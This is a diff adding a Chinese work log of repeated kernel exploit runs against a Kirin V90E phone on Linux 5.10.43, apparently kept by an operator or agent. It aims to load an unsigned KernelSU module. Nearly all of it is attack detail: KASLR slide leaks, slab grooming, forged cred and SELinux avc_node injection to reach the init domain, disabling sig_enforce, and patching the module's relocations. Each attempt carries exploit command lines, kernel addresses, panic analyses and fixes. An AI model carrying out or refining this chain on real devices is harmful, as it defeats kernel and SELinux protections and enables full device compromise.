@@ -1,0 +1,3046 @@
+Kirin V90E 5.10.43 加载真 kk.ko 记录（每一次都落盘）
+====================================================================
+
+[a9] 2026-11-05 16:45  无落盘日志（a9.log 重启后全 NUL，内容丢失）
+  结论：仅存 kaslr_base=0xffffffe8d4280000 → slide=0x28c4280000（可核算）
+
+[a10] 2026-11-05 16:50  无落盘日志（a10.log 全 NUL，内容丢失）
+  pstore 证据已恢复：D:\98260\logs\pstore_a10_console.txt
+  - 402.056s: kernel BUG at arch/arm64/kernel/insn.c:1390
+  - pc: module_emit_plt_entry+0x1e0, lr: module_emit_plt_entry+0xdc
+  - 调用链: module_emit_plt_entry → apply_relocate_add+0x5a4 → load_module+0x238c → __arm64_sys_init_module+0x25c
+  - Kernel Offset: 0x28c4280000 from 0xffffffc010000000
+  - 结论(复核后修正): 不是 plt_num_entries 溢出，而是 kk.ko 实际按 slide 0x278f900000 烘焙，
+    与当次真实 slide 0x28c4280000 偏差约 4.5GB，PLT 里 ADRP 编码越界触发 insn.c BUG。
+
+[a11] 2026-11-05 17:22
+  boot: 17:22 前一次启动；kaslr slide=0x2879880000（hits=3）
+  ko: 设备 kk.ko md5 ED9FF749A31A6E2A361EE394C29C8384
+      实际烘焙值经 printk/prepare_creds 反推 = 0x278f900000（ko_baked.txt 写的 0x28c4280000 是错的）
+      kodelta: patched=188 old=0x278f900000 new=0x2879880000 delta=0xe9f80000
+      烘后 md5 03ACE658E89D9B82C131DB4904D41573；printk=0xffffffe889a67c98（=nominal+slide，校验通过）
+  wr93: -I -U FCIMP -m kk.ko -t -W -s 0x2879880000 -n 631 -p 60 -g 8 -y 1200 -a 2 -Y
+  结果: 设备 ~17:22:5x panic 重启。a11.log 落盘后仍被清零（全 NUL，3458B）
+  pstore: D:\98260\logs\pstore_a11_console.txt
+  - 2352.871s: Internal error: Oops: 96000004 (translation fault level 0)
+  - pc: apply_relocate_add+0x16c, lr: apply_relocate_add+0x5a4, 故障指令 b94002a9 (ldr w9,[x21])
+  - x21=0x000004151ea1e000 = module core base + r_offset
+  - Kernel Offset: 0x2879880000（与烘焙一致，说明 slide/烘焙这次正确）
+  根因: kk.ko 的 .rela.text 第 1653 条损坏：r_offset=0x42d00000000（正常应为 0x827c）
+        place = 0xffffffe81ea00000 + 0x42d00000000 → 0x4151ea1e000 非法地址 → 缺页 panic
+  修复: 换用 .rela.text#1653 = 0x827c 的干净 ko（kk_4b88.ko / base_kk.ko）
+
+[a12] 2026-11-05 17:30
+  boot: 新 boot（boot≈17:22:53）；kaslr slide=0x13a4e80000（hits=3，base=0xffffffd3b4e80000）
+  ko: /data/local/tmp/kk12.ko = kk_4b88.ko（md5 60DAC82DDF58B0CF138BE2BC7256865F）
+      烘焙值 0x22f9c80000 → 0x13a4e80000；kodelta patched=188 delta=0xfffffff0ab200000
+      烘后 md5 4BE9B1F9B695AF594B664E45CAAB417F；printk=0xffffffd3b5067c98（校验通过）
+      静态校验: 坏重定位=0（bad=0）
+  wr93: -I -U FCIMP -m kk12.ko -t -W -s 0x13a4e80000 -n 631 -p 60 -g 8 -y 1200 -a 2 -Y
+  结果（完整落盘 D:\98260\logs\a12.stream.log）:
+      victim pfn=297735, GATE=PASS (mine_unmov=1 mt=0 ord=0), reap status=0x9
+      [B21] repair pwrite=-1 errno=29(Invalid seek) → [B19] stage1 rc=-2
+      [U] root_probe_patch rc=-1 → 未进入 init_module，设备存活未 panic
+  结论: 本次失败在 stage1 的 uhid 修复步（pwrite ESPIPE），与 ko 无关；
+        需新 boot 重试（每次 boot 只打一枪）
+
+[a13] 2026-11-05 17:36:13 boot / 17:38:33 panic（uptime 140.01s）
+  boot: kaslr slide=0x18d9480000（hits=3，base=0xffffffd8e9480000）
+  ko: /data/local/tmp/kk12.ko = kk_4b88.ko 重烘；kodelta patched=188 delta=0xfffffff5df800000
+      烘后 md5 A3F9D8C91C46A1C2E5C21F28E05946D7；printk=0xffffffd8e9667c98；bad=0
+  wr93: -I -U FCIMP -m kk12.ko -t -W -s 0x18d9480000 -n 631 -p 60 -g 8 -y 1200 -a 2 -Y
+  设备端日志 a13.log 仅落盘 5502B（stdout 全缓冲，panic 后尾部丢失，内容止于 round 1）
+  已恢复: D:\98260\logs\a13.recovered.log ；panic: D:\98260\logs\pstore_a13_console.txt
+  几何: victim=15226 tid=15227 timers=631 holes=0 slab pfn=3222096 目标页=3222097
+        [B12F] 伪 cred @0xffffff8312a51100  tsec @0xffffff8312a511c0
+        [B12A] 伪 avc_node @0xffffff8312a511f0
+        [B12I] misc_list=0xffffffd8ec9c7860
+        [B13] round 1: free(n=2) alloc(node pfn=3222097 n=0 mine=0 mine_unmov=0 mt=-1 order=-1)
+  panic: 140.010131s, pid 15350 comm=pgrep
+        Internal error: Oops: 96000045（NULL 写）/ pc: avc_alloc_node+0x1bc/0x374
+        指令: ldp x8,x9,[x25,#0x20]; str x8,[x9]，x25=0xffffff8312a511f0(=伪 avc_node)，x9=0
+        Call trace: avc_alloc_node ← avc_compute_av ← avc_has_perm ← selinux_inode_getattr
+                    ← vfs_statx ← __arm64_sys_newfstatat（pgrep 读 /proc 触发）
+        Kernel Offset: 0x18d9480000（与烘焙值完全一致 → KASLR 预测/烘焙这次是对的）
+  复核结论(重要):
+    1) 伪 avc_node 已被写进 selinux_avc 的哈希桶（否则内核不会用 x25=该地址去摘链），
+       说明 a13 已走过: 抢页成功→GATE→reap→stage1(uhid bridge)→[F] cred/sid→④c AVC 注入。
+       即本枪是全链里走到最远的一枪，只差 probe 的 init_module 没落下（Modules linked in: 为空）。
+    2) 崩点机理: 伪节点布局只写了 ssid/tsid/tclass/avd.allowed，未写 hlist_node 的
+       next(+0x28)/pprev(+0x30)；pprev=0 时任何摘链（avc_node_delete / avc_node_replace /
+       avc_reclaim_node）都会执行 str next,[pprev] → 写 NULL → panic。
+       触发者正是 fire 脚本里的 `while pgrep wr93; do sync; sleep 1; done`（每秒一次
+       SELinux inode 检查 → avc 分配 → active_nodes 超阈值 → avc_reclaim_node 摘桶）。
+    3) 修复方向(a14): aaw_write64(伪node+0x30, slot) 补 pprev；同时把看门狗 pgrep 换成
+       kill -0 轮询（shell 内建，不触发 SELinux 检查），或直接去掉看门狗。
+
+[a14-1] 2026-11-05 18:09 boot（slide=0x18b5c80000，base=0xffffffd8c5c80000），未开枪
+  ko: kk14.ko = kk_4b88.ko(md5 60DAC82DDF58B0CF138BE2BC7256865F) 重烘
+      kodelta patched=188 delta=0xfffffff5bc000000 → md5 0FD4918A9977F15DA6748654B849718B
+      scan bad=0 abs_min=0xffffffd8c5c87a6c（=base+0x7a6c，与历史一致）
+  wr93: wr93_pprev（md5 2D98E65A0440D5186CED1431AEF48351，已补 pprev），
+        主机侧 `adb exec-out ... | Tee-Object` 实时落盘 → D:\98260\logs\a14.stream.log
+  结果: 未进入 victim 破坏阶段，两次 attempt 均被几何闸拒绝
+        attempt1 recs=635/631 满30=16 → 几何脏；attempt2 slabdata=37 > 33 → slabdata 闸
+        VERDICT: 2 次尝试全部未拿到 (hit+discard)；设备存活，无 panic
+  结论: 纯 victim 选择失败（与伪节点/ko 无关），同一 boot 杀掉残留 filler 后继续重试
+
+[a14-2] 2026-11-05 18:12 同一 boot 重试，未开枪
+  日志: D:\98260\logs\a14b.stream.log
+  结果: attempt1 recs=633/631 满30=18 → 几何脏；attempt2 slabdata=41 > 33 → slabdata 闸
+        VERDICT: 2 次尝试全部未拿到；设备存活
+  结论: 本 boot 的 posix_timers_cache 已被前一轮 timer 撑到 41 slabs，越打越脏，无法自愈；
+        需新 boot + 尽早上枪（a13 就是 fresh boot 早期开枪才过闸）
+
+[a14-3] 2026-11-05 18:14 fresh boot（slide=0x1182480000，base=0xffffffd192480000），未开枪
+  ko: kk14.ko 重烘 patched=188 delta=0xffffffee88800000 → md5 6F5EC46A880DB73A703FFC9A116578D0
+      scan bad=0 abs_min=0xffffffd192487a6c（=base+0x7a6c ✓）
+  wr93_pprev: md5 2D98E65A0440D5186CED1431AEF48351；uptime≈122s 开枪（t=121993ms）
+  日志: D:\98260\logs\a14c.stream.log
+  结果: attempt1 recs=632 满30=19 arm_i=58 alias=1；attempt2 recs=632 满30=20 arm_i=29 alias=1
+        VERDICT: 2 次尝试全部未拿到；设备存活，无 panic
+  结论: 几何闸要求 recs 严格 631 且无 alias，但 1 条泄漏重复记录（同一 slab 出现 31 条
+        pid=tid 记录）导致每枪都被拒（群组里实际只有 30 个对象）
+
+[a14-4] 2026-11-05 18:16 同一 boot 清理残留后重打（-a 4），未开枪
+  日志: D:\98260\logs\a14d.stream.log
+  结果: 4 次 attempt 全部 alias=1（有两次 c30 也掉到 18、over=3）
+        attempt2 slabdata=37 > 33；VERDICT: 4 次尝试全部未拿到
+  结论: alias 是泄漏扫描的重复记录（幻影），不是多出的活对象；目标 slab 仍从 cnt==30
+        的干净组里选，alias<=1 不影响 order-1 slab 的 discard
+
+[a14-5 准备] 2026-11-05 18:20
+  代码改动: wr1.c 几何闸 alias>0 → alias>1（其他条件不变：over<=1、c30>=19、arm_i<=60、
+            slabdata<=33）；wr93_pprev2 md5 FF59B2ED6F1345290FE77CC6F3CABCE5 已推送
+  待: 新 boot + 新 slide 重烘 ko，用 wr93_pprev2 开枪
+
+[a14-5] 2026-11-05 18:26 真开枪（fresh boot，uptime≈115s）—— 全链走到 init_module 调用
+  slide=0x2093e80000 base=0xffffffe0a3e80000；ko kk14.ko 重烘 patched=188
+      md5 00629E0D084B96A47F65A42A8786D2A8；scan bad=0 abs_min=0xffffffe0a3e87a6c ✓
+  wr93_pprev2 md5 FF59B2ED6F1345290FE77CC6F3CABCE5（几何闸 alias<=1）
+  日志（主机侧实时落盘，无丢失）: D:\98260\logs\a14e.stream.log
+  数值:
+    [R0b] 轮1/1 t=115129ms pid=15124；victim=15162
+    [B8] zombie=Z comm='v-main' in 52553us | ku=-1 | reads=63 opens=126276
+    [B12A] 伪 avc_node @ 0xffffff8310d3f1f0
+    [B13] round1 pipe=2048 in 150017us free(n=2) alloc(pfn=3214655 mine=0) cum_free=2
+    [B13] round2 pipe=2048 in 150028us free(n=0) alloc(pfn=3214655 mine=1 mine_unmov=1 mt=0 order=0)
+    [B15] GATE=PASS | alloc_round=2 free_cnt=2
+    [B17] reap done status=0x9
+    [B19] stage1 完成 rc=0（uhid 桥）
+    [F] sig_enforce(0xffffffe0a732d468) <- 0 rc=0
+    [F] 命中 sid=68 -> u:r:init:s0 ★
+    [F] task->pid/tgid(0x878) <- 0 rc=0（HKIP）
+    [F] avc_node key ssid=tsid=68 rc=0
+    [F] avc_node pprev(+0x30) <- bucket 0xffffffe0a77476c8 rc=0   ← 本次修复生效，未再 panic
+    [F] 已放行 probe 调 init_module；comm 采样 +0ms R / +2ms W0_CALL / +8ms W2_PAUSE
+    [F] module kk14.ko 预读完成 3534080/3534080 bytes
+    [HKp] probe 15144 setresgid rc=0
+  结果: probe 停在 W2_PAUSE（wchan=__arm64_sys_rt_sigsuspend），/proc/modules 为空，
+        无任何 module 相关 dmesg，设备存活未 panic。
+        父进程阻塞在 sel-pipe read（probe 一直持有 fd1），属预期驻留；rc 值未被采样到。
+  结论: pprev 修复成功——同样的 AVC 注入这次没有再触发 NULL 写 panic，全链已走到
+        init_module 返回（8ms 内返回、comm 已到 W2_PAUSE）。现在缺的是 rc 数值，
+        用它才能判定是 -EACCES（AVC 放行没生效）/ -EPERM（签名或厂商校验）/ -ENOEXEC（ELF/重定位）。
+  a15 准备: wr93_pprev3 md5 DC25D46BB340795C963FDE499F3949BB（已推送）
+        init_module 后把 rc/errno 写 /dev/kmsg（[KKP] 行，panic 后可读）+ 留在 comm
+        (W2_r<rc>_e<errno>)，即使进程停住也能事后取证
+
+[a15 准备] 2026-11-05 18:55  只做静态分析与代码准备，未动设备
+  目标: 取回 init_module 的 rc/errno + 内核拒绝原文，按分支判定（spec: D:\98260\a15_spec\spec.md）
+  静态复核（内核源码逐行）:
+    - hooks.c:3949-3951  init_module(file==NULL) 的 AVC 键 = (sid, sid, SECCLASS_SYSTEM=4, SYSTEM__MODULE_LOAD)
+    - avc.c:613-631      avc_search_node 只比较 ssid/tsid/tclass，不检查 xp_node；
+                         伪节点 avd.allowed=0xFFFFFFFF、auditallow=0 → 命中即 allowed、audit 返回 0
+    - module.c:3917      may_init_module() → !capable(CAP_SYS_MODULE)||modules_disabled → -EPERM
+    - module.c:2958      copy_module_from_user → security_kernel_read_file(NULL,READING_MODULE) → -EACCES
+    - module.c:3723+     load_module: ELF/vermagic/符号(ENOENT)/CRC(ENOEXEC)/重定位/模块 init 返回值
+    - 华为侧: module.c 仅 #include hkip_hhee.h，加载路径无 hkip 调用；find_hisi_module 只读查表；
+             modules_disabled 只由 nomodule 核心参数置位
+    - vermagic(kk_4b88 / kk14c_baked / kk_a11 / base_kk 四份一致) =
+      5.10.43 SMP preempt mod_unload modversions aarch64
+    - a10 崩在 apply_relocate_add(=may_init_module 与 AVC 之后) → 反证 EPERM/EACCES/vermagic 可过
+  代码改动 wr1.c（全部在 FCIMP=唤醒即 init_module 分支）:
+    1) init_module 后写 [KKP] 到 /dev/kmsg；comm 固定 W2_r<rc>_e<errno>（pprev3 已有）
+    2) 新增 kmsg_dump_tail(): 只读 /dev/kmsg，过滤 module/kernelsu/symbol/vermagic/version/reloc/KSU/[KKP]，
+       尾部 8KB 经 fd1(父进程 sel-pipe) 回传 → 主机实时落盘；打不开只打印 errno
+    3) 新增 module_state_probe(): 读 /proc/modules + access(/sys/module/kernelsu, /dev/kernelsu)
+    取证全部在 init_module 返回之后，不改攻击时序
+  编译: Android NDK r27c (27.2.12479018) aarch64-linux-android31-clang -O2 -static
+    产物 wr93_pprev4  md5 A6360E4CF0AB66A47F705061ADC83A86  size 2349304
+    与 pprev3(size 2347728) 同工具链、同为 bionic 静态；仅多取证代码(+1576B)
+  校验: 二进制含 "[KKP] init_module rc=" / "W2_r%ld_e%d" / "[K] ---- kmsg tail" / "/sys/module/kernelsu="
+  待: 用户授权 fresh boot 后 → kaslr → kodelta 烘焙 kk15.ko → 开枪（禁止 pgrep 看门狗、禁止 adb pull）
+
+[a15 执行] 2026-11-05   用户授权："可以直接打，我已经重启过了，后面还是一样每一次都要详细记录"
+  工具链/产物:
+    wr93_pprev4  NDK r27c(27.2.12479018) aarch64-linux-android31-clang -O2 -static
+                 md5 A6360E4CF0AB66A47F705061ADC83A86  size 2349304（已推送，设备端 md5 一致）
+    kk_4b88.ko   md5 60DAC82DDF58B0CF138BE2BC7256865F  size 3534080  bad=0
+    kk15.ko      设备端 kodelta 按 slide 烘焙 → 回传 md5 cbaea74fdfda8f7441677974237d3ea8
+                 size 3534080  bad=0  abs_min=0xffffffe9da287a6c（= slide+0x7a6c 正确）
+  运行数值（完整，日志 D:\98260\logs\a15.stream.log）:
+    slide=0x29ca280000 | cred_cs=0xffffffe9da3e38d4 timer_cs=0xffffffe9da4bf748
+    task_cs=0xffffffe9da3930a8 self_tid=7136 | ncpu=6 vcpu=1 ntimer=631 nfill=6 npipe=60
+    clock=THREAD(-t) spray=pipe attempts=2 uid=2000 euid=2000 gid=2000
+    [SM] cred leak tid=7165 cred=0xffffff82f2fe3b40 recs=1 (off=0x4)
+    probe_task=0xffffff8331fe0000
+    [B6] fillers=6 [CEDBFA]；空洞填充器 7188=145 timer / 7189=29 timer → holes=0
+    victim=7190 tid=7191 timers=631 holes=0 recs=631 slabs=22 last_slab=8655460
+    [B2d] groups=22 满30=20 前8组(cnt:pfn) 29:2254386 30:2302920 30:1081332 30:4151448
+          30:344878 30:2254392 30:2256618 30:2256630
+    [B2a] arm_i=58 addr=0xffffff82323c9ed0
+    [B2b] slab pfn=2302920 cnt=30 node=0xffffff82323c9f58 off=0xf58 head=2302920（目标页 2302921）
+    [B7] slabinfo(pre-go) 960 960 272 30 2 slabdata 32 32 0
+    窗口: go+348us det+14us kill+362us；zombie=Z 3019us；reads=64 opens=118617 err=0
+    [B8b] slabinfo(at-hit) 960 960 272 30 2 slabdata 32 32 0
+    [B12F] 伪 cred 0xffffff82323c9100 (page+0x100) tsec 0xffffff82323c91c0
+    [B12A] 伪 avc_node 0xffffff82323c91f0 (page+0x1f0)
+    [B12T] slots=10 skip=5（每槽 parent=(misc-8)|1 right=Pnode left=0）
+    [B12I] off=0xf58 aux=0x400 P=0xffffff82323c9400 Pnode=0xffffff82323c9418
+           Q=0xffffff82323c9580 F=0xffffff82323c9640 misc_list=0xffffffe9dd7c7860
+    [B12c] pipe#0 F_SETPIPE_SZ(1MB) ret=1048576 F_GETPIPE_SZ=1048576；pipes=60
+    [B13] round1 pipe=2048 in 150014us | free(n=2) alloc(pfn=2302921 n=0 mine_unmov=0) cum_free=2
+          round2 pipe=2048 in 150028us | free(n=0) alloc(pfn=2302921 n=1 mine=1 mine_unmov=1
+          mt=0 order=0) cum_free=2
+    [B15] GATE=PASS (mine_unmov=1 mine=1 any=1) alloc_round=2 free_cnt=2
+    [B17] reap done status=0x9（写原语已执行）
+    [B20] open /dev/uhid 134 errno=11；[B21] repair pwrite=128 errno=0；
+    [B22] open2 /dev/uhid 135 errno=0；[B19] stage1 rc=0（VERDICT: STAGE1 桥就绪）
+    probe pid=7165 task=0xffffff8331fe0000 fake_cred=0xffffff82323c9100 tsec=0xffffff82323c91c0
+    sig_enforce(0xffffffe9dd72d468)<-0 rc=0
+    real_cred/cred -> 0xffffff82323c9100 rc=0
+    命中 sid=68 -> u:r:init:s0 ★
+    task->pid/tgid(0x878) <- 0 rc=0
+    avc_node key ssid=tsid=68 rc=0
+    avc_node pprev(+0x30) <- bucket 0xffffffe9ddb476c8 rc=0
+    avc slots[276] @ 0xffffffe9ddb476c8 -> fake_list 0xffffff82323c9218 rc=0
+    module /data/local/tmp/kk15.ko 预读完成 3534080/3534080 bytes
+    [HKp] probe 7165 setresgid rc=0
+    comm 采样: +0ms 'wpAAAAAAABBBBBB' | +2ms 'W0_CALL' | +10ms 'W1_R2' | +13ms 'W2_r-1_e2'
+  结果:
+    init_module 返回 rc=-1 errno=2 (ENOENT)   ← comm 持久为 W2_r-1_e2，可事后取证
+    probe 存活驻留；/proc/modules 为空；/sys/module/kernelsu 不存在；设备未 panic
+    父进程 7136 阻塞在 sel-pipe read（probe 持有 fd1），属预期驻留
+    取证通道: [K] kmsg_dump_tail / module_state_probe 的输出全部未落盘
+      → 换 cred 到 init 域后写 shell 侧 sel-pipe 被 SELinux 拒（dprintf 失败），非未执行
+      → dirtyinit 读 /dev/kmsg 每次只取到 1 条（a15_kmsg.txt 118B，仅一条 NFC 记录）
+    根因: load_module → simplify_symbols Unknown symbol
+      ko 唯一未定义符号 = make_kgid（kallsyms 数据源无此符号，kodelta patched=188 未覆盖它）
+      → -ENOENT；与内核 module.c 的 Unknown symbol 分支完全一致
+  修复（主机侧，已完成）:
+    make_kgid(ns,gid) 在 init_user_ns 下恒等 → 调用点 0x827c 改 mov w0,w1 (0x94000000→0x2a0103e0)
+    符号表 make_kgid: st_shndx 0x0000(UNDEF) → 0xfff1(SHN_ABS)、st_value=0
+    该 reloc 条目: r_info(type 283 CALL26 → 0 = R_AARCH64_NONE，sym 保留 1069)、r_addend=0
+      （内核 arm64 module.c:318-323 对 R_ARM_NONE/R_AARCH64_NONE 执行 ovf=0; break; 跳过）
+    fix_makekgid.py 修复: 原第 42 行把 r_info 写到 p(r_offset) → r_offset 变 0x42d00000000（bad=1，
+      与 a11 崩点同源）；改为写 p+8，并清 p+16 的 addend
+    产物 kk_4b88_fixkgid.ko md5 DA52279A7C92BE732C83C034A0C9A756 size 3534080
+      scan: bad=0 abs_min=0xffffffe309c87a6c（与干净 ko 一致，未被破坏）
+      ck_ko: sym make_kgid=('0xfff1',0)；type0 reloc @0x827c (sym=1069 add=0)；无 make_kgid UNDEF
+  下一步: 新 boot（需用户同意）→ 取新 slide → push 修复版 ko → kodelta 烘焙 → 校验
+          bad=0 且 abs_min=slide+0x7a6c → a16 开枪，看 rc 是否 0 或进入模块 init 返回值
+
+[a16 执行] 2026-11-05 19:39 reboot（用户已同意）
+  boot#1 boot_id=9260ceb3-ba0f-411f-bfa3-59c33468034e | uptime→300s 后开跑
+    slabdata(开跑前)=6 | kaslr: raw_values=4 hits=3 slide16=0000002584280000 → slide=0x2584280000
+    base=0xffffffe594280000 | tracing_on=1 | InvokeRoot: result=Guarded handler invoked once
+    push kk16.ko = kk_4b88_fixkgid.ko，设备 md5 da52279a7c92be732c83c034a0c9a756（一致）
+    kodelta kk16.ko 0x22f9c80000 0x2584280000 → patched=188 delta=0x28a600000
+    烘焙后 md5 0d08b4c95300ef3ddeb82870b060480a（base64 回传解码一致）
+    scan: bad=0 abs_min=0xffffffe594287a6c（= slide+0x7a6c ✓）
+    ck_ko: make_kgid=('0xfff1',0)；type0 reloc @0x827c (sym=1069 add=0)；无 UNDEF
+  a16a（-a 1，只 1 次尝试）日志 a16.stream.log / 设备 a16.log（2541B）
+    pid=17791 probe=17814 cred=0xffffff836f653180 probe_task=0xffffff882e265dc0
+    fillers=6 [CDEFBA]；填充器 17830=113 timer / 17831=29 timer → holes=0
+    victim=17832 tid=17833 timers=631 holes=0 recs=633 slabs=22 last_slab=344618
+    [B2d] groups=22 满30=19；前8组 29:1288324 30:8577992 30:8489340 30:427878
+          30:354376 30:3139674 30:8606148 30:8606150
+    [B2b] slab pfn=8577992 cnt=30 node=0xffffff882e3c9f58 off=0xf58 target=8577993
+    [B2e] 归属异常: recs=633 okc=631 多=2 非满组=2 | 29:1288324 31:3139678
+    [-] 几何脏 (recs=633/631 满30=19/22 arm_i=58 alias=1) → 弃用 victim
+    VERDICT: 1 次尝试全部未拿到 (hit+discard)（g_attempts=1 → for(;;)pause() 驻留）
+    处理: 手工 kill -9 17791 17814..17820 17830 17831；slab 回落到 185/330 slabdata 11
+  a16b（-a 2，同 boot 第二次开枪）日志 a16b.stream.log（3573B，设备 a16b.log）
+    victim=20674 tid=20675 timers=631 holes=0 recs=631 slabs=22 last_slab=3880670
+    [B2d] 满30=20；前8组 29:344618 30:1472546 30:1454736 30:1454738 30:1454740
+          30:1454742 30:294432 30:294434
+    [B2a] arm_i=58 addr=0xffffff8167823ed0
+    [B2b] slab pfn=1472546 cnt=30 node=0xffffff8167823f58 off=0xf58 target=1472547
+    [B7] slabinfo(pre-go) 960 960 272 30 2 slabdata 32 32 0
+    窗口: go+523us det+27us kill+550us；zombie=Z 71983us；reads=62 opens=133211 err=0
+    [B8b] slabinfo(at-hit) 960 960 272 30 2 slabdata 32 32 0
+    [B12F] 伪 cred 0xffffff8167823100 tsec 0xffffff81678231c0
+    [B12A] 伪 avc_node 0xffffff81678231f0
+    [B12T] slots=10 skip=5
+    [B12I] off=0xf58 aux=0x400 P=0xffffff8167823400 Pnode=0xffffff8167823418
+           Q=0xffffff8167823580 F=0xffffff8167823640 misc_list=0xffffffe5977c7860
+    [B12c] pipe#0 F_SETPIPE_SZ(1MB)=1048576；pipes=60（每 pipe 256 页）
+    日志止于 [B12e] → 设备随即断开/重启（未出现 [B13] round1）
+    复查: boot_id 变为 162be7bb-d499-4e3a-8089-bf8e85fb37a8，uptime 归零（19:53 左右重启）
+    pstore(/sys/fs/pstore) shell 无权限；dmesg klogctl Operation not permitted
+    结论: a16b 在 pipe 喷涂阶段（B12e→B13 之间）触发设备重启，属新的崩点，非 make_kgid 修复导致
+          （ko 尚未进入 init_module）；待 a16c 重打并取证
+  boot#2（a16b 自行重启后）boot_id=162be7bb-d499-4e3a-8089-bf8e85fb37a8
+    kaslr: raw_values=7 hits=3 slide16=0000002320e80000 → slide=0x2320e80000 base=0xffffffe330e80000
+    slabdata(开跑前)=6 | push kk16c.ko（da52279a…）→ kodelta 0x22f9c80000→0x2320e80000
+      patched=188 delta=0x27200000 → kk16c md5 95951ea88257485261afb81f97e79d70
+      scan: bad=0 abs_min=0xffffffe330e87a6c（= slide+0x7a6c ✓）；ck_ko make_kgid 0xfff1/0、type0@0x827c
+  a16c（-a 2）日志 a16c.stream.log
+    填充器 16807=145 timer / 16808=29 timer
+    victim1=16809 tid=16810 recs=642 slabs=22 满30=10 arm_i=120 | 前8组
+      29:3171676 31:1476834 31:1174608 30:1174610 31:454356 31:454358 31:3091600 30:3091602
+      [B2b] pfn=1174610 cnt=30 node=0xffffff811ec53f58 target=1174611
+      [B2e] recs=642 okc=631 多=11 非满组=2 → 几何脏(recs=642/631 满30=10/22 arm_i=120 alias=10) 弃用
+    victim2=16821 tid=16822 recs=635 slabs=22 满30=17 arm_i=29 | 前8组全部 30:1477486..1475900
+      [B2b] pfn=1477486 node=0xffffff8168b6ff58 target=1477487
+      [B2e] recs=635 okc=631 多=4 → 几何脏(满30=17/22 alias=4) 弃用
+    == VERDICT 2 次全部未拿到；进程 pause 驻留 → 手工 kill；slab 回 182/330 slabdata 11
+  a16d（-a 2，同 boot#2）日志 a16d.stream.log（4607B）
+    victim=17392 tid=17393 recs=631 slabs=22 满30=20 last_slab=3093010
+    前8组: 29:1493244 30:1493242 30:3098978 30:1551526 30:2943038 30:3114960 30:4027654 30:3109708
+    [B2a] arm_i=58 addr=0xffffff816c8fbed0 | [B2b] pfn=1493242 cnt=30 node=0xffffff816c8fbf58 target=1493243
+    [B7] 930 930 272 30 2 slabdata 31 31 0 | [B8b] 同
+    窗口: go+1950us det+17us kill+1967us；zombie 97669us；reads=64 opens=108555 err=0
+    [B12F] 伪 cred 0xffffff816c8fb100 tsec 0xffffff816c8fb1c0；[B12A] avc_node 0xffffff816c8fb1f0
+    [B12T] slots=10 skip=5 | [B12I] P=0xffffff816c8fb400 Pnode=+0x18 Q=0xffffff816c8fb580
+      F=0xffffff816c8fb640 misc_list=0xffffffe3343c7860 | [B12c] pipe#0=1048576 pipes=60
+    [B13] round1 2048 页 in 150022us | free(n=2) alloc(pfn=1493243 n=1 mine=1 mine_unmov=1 mt=0 ord=0) cum_free=2
+    [B15] GATE=PASS (mine_unmov=1) alloc_round=1 free_cnt=2
+    [B15] GATE_REJECT alloc_round=1 free_cnt=2 (<2/<2) → 不进 reap
+    随后进程 17354 停在 sigsuspend（wchan=__arm64_sys_rt_sigsuspend），日志停在 [SAFE] 行
+    20:06 左右设备再次自行重启 → boot_id=eaa126b9-2fcf-4400-945b-1b771678d77c，slabdata=6
+  小结(a16 三段): 均未进入 init_module；失败模式分别为
+    几何脏×3（满30 10/17/19）、GATE alloc_round=1 被拒×1、自发重启×2
+    修复版 ko 已三次通过静态校验（bad=0、abs_min=slide+0x7a6c、make_kgid SHN_ABS/type0），尚未被内核解析
+
+[a16e 执行] 2026-11-05 20:12~20:26  ——首次进入 init_module（关键转折）
+  boot#3 boot_id=eaa126b9-2fcf-4400-945b-1b771678d77c
+    等待 uptime≥300：kaslr 时刻 uptime=307.00s（idle 1309.18）
+    开枪时刻 /proc/uptime=1212.52s（idle 5666.11）
+  root/KASLR:
+    InvokeRoot: INSTRUMENTATION_RESULT=result=Guarded handler invoked once（每次照旧）
+    tracing_on=1（回读 1）
+    kaslr_self: raw_values=4 hits=3 slide16=0000001f6fa80000
+      slide=0x1f6fa80000  base=0xffffffdf7fa80000  （写入 /data/local/tmp/kaslr_base）
+  ko:
+    推送 kk16e.ko = kk_4b88_fixkgid.ko，设备 md5 da52279a7c92be732c83c034a0c9a756（本地一致）
+    kodelta kk16e.ko 0x22f9c80000 0x1f6fa80000 → patched=188  delta=0xfffffffc75e00000
+    烘焙后 md5 6a03d4070de7105deae89e75d5f9d3da（base64 回传解码一致）size 3534080
+    scan: bad=0 abs_min=0xffffffdf7fa87a6c（= slide+0x7a6c ✓）
+    ck_ko: make_kgid=('0xfff1',0)；reloc tot=74116；type0=(0x827c,sym1069,add0)；
+           UR=1 make_kgid_in_undef=False
+  wr93_pprev4 md5 a6360e4cf0ab66a47f705061adc83a86 size 2349304（设备一致）
+  起火（脚本 a16e_fire.sh，LF）：setsid ./wr93_pprev4 -I -U FCIMP -m /data/local/tmp/kk16e.ko
+        -t -W -s 0x1f6fa80000 -n 631 -p 60 -g 8 -y 1200 -a 2 > /data/local/tmp/a16e.log 2>&1
+  结果: 约 20:26 设备 panic 重启；a16e.log 3579B 全 NUL（panic 清零）；
+        主机实时 stream D:\98260\logs\a16e.stream.log 为 0B（stdout 未 flush 即 panic）
+        新 boot aa6a5450-9985-4a58-9fa7-5eee6744e888（20:28 检查 uptime=93.90s）
+  pstore（shell 直读路径可读，无需 root）:
+    /sys/fs/pstore/dmesg-ramoops-0   218338B → D:\98260\logs\pstore_a16e_dmesg.txt
+       （去 NUL 后 220741B → pstore_a16e_dmesg_clean.txt）
+    /sys/fs/pstore/console-ramoops-0 524276B → D:\98260\logs\pstore_a16e_console.txt
+       （clean 530261B）
+  关键时间线（printk 6469.5s）:
+    6469.589172 wr93_pprev4 pid=21351 cpu0
+    6469.589202 usercopy_warn: SLUB 'task_struct' offset 2624 size 8
+                call: simple_write_to_buffer ← configfs_write_bin_file ← vfs_write
+                      ← __arm64_sys_pwrite64（本次仅 WARNING，未 panic）
+    6469.594726 HISEC stp uevent: stpinfo=386:1:1:0 mod-sign result=-61
+                pcomm=gcomm=W0_CALL gid=0
+    6469.595001 [kernel_stp_uploader] event upload finished result=0
+    6469.595031 kernelsu: no symbol version for module_layout
+    6469.595031 kernelsu: loading out-of-tree module taints kernel
+    6469.595794 kernelsu: module verification failed: signature and/or required
+                key missing - tainting kernel（仅 taint，未阻断）
+    6469.599517 Bad mode in Synchronous Abort handler detected on CPU1,
+                code 0x36000002 -- BTI
+                Code: bad PC value；pstate=20400805 (nzCv daif +PAN -UAO -TCO BTYPE=-c)
+                pc = __cfi_check+0x0/0x7e0 [kernelsu] = 0xffffffdf72729000
